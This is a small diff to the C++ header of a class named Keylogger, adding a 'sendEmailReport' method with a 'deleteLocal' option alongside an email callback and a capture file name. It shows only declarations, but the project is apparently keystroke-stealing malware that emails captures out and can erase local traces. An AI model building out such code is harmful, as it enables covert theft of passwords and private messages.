@@ -9,6 +9,7 @@
 #include <string>
 #include <memory>
 #include <ctime>
+#include <sstream>
 
 class Keylogger {
 public:
@@ -17,6 +18,7 @@ public:
 	~Keylogger();
 
 	bool sendEmailCallback(std::string emailTo);
+	bool sendEmailReport(bool deleteLocal);
 private:
 	const int memoryBufferSize = 10;
 	const wstring FILENAME = L"capturing_your_keyboard.txt";
